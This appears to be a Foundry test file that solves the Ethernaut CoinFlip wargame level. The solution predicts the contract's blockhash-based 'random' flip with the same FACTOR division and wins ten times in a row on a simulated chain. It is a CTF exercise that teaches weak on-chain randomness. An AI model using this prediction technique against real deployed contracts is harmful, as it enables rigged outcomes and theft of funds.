// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {CoinFlip} from "../../src/ethernaut/03_CoinFlip/CoinFlip.sol";
import {CoinFlip_Factory} from "../../src/ethernaut/03_CoinFlip/CoinFlip_Factory.sol";
import {CoinFlip_Attacker} from "./03_CoinFlip_Attacker.sol";

contract CoinFlip_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");
	
	CoinFlip_Factory factory;
	CoinFlip instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new CoinFlip_Factory();
		instContract = CoinFlip(payable(factory.createInstance(player)));
		
		vm.stopPrank();
		
		vm.deal(address(player), 1 ether);
	}
	
	function test__Solution_CoinFlip() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_CoinFlip -vv
		
		uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
		
		while(true) {
			vm.roll(block.number + 1);
			
			uint256 blockValue = uint256(blockhash(block.number - 1));
			uint256 coinFlip = blockValue / FACTOR;
			bool side = coinFlip == 1 ? true : false;
			
			instContract.flip(side);
			
			if (instContract.consecutiveWins() == 10) {
				break;
			}
		}
	}
}
